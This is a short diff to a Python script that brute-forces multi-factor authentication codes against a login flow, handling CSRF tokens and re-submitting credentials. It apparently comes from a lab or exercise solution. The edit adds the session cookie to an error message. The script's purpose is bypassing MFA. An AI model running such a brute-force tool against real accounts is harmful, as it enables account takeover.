@@ -122,7 +122,7 @@ def brute_force_mfa(session, csrf, credentials, digits=4):
         elif find_html_attribute(resp.content, 'h1', 'Login'):
             resp = authn_credentials(session, {'Referer': "{}/login2".format(host)}, csrf, credentials)
         else:
-            raise Exception(f"ERROR: unexpected response - unable to continue - mfa_code {mfa_code}")
+            raise Exception(f"ERROR: unexpected response - unable to continue - mfa_code {mfa_code} session: {session.cookies.get_dict()['session']}")
 
         if resp.status_code != 200:
             raise Exception(f"ERROR: POST returned {resp.status_code} status - mfa_code {mfa_code}")
@@ -154,5 +154,3 @@ if __name__ == "__main__":
         raise Exception('ERROR: failed to extract CSRF token from /login2 response')
     
     brute_force_mfa(session, csrf, credentials={'username': args.username, 'password': args.password})
-
-
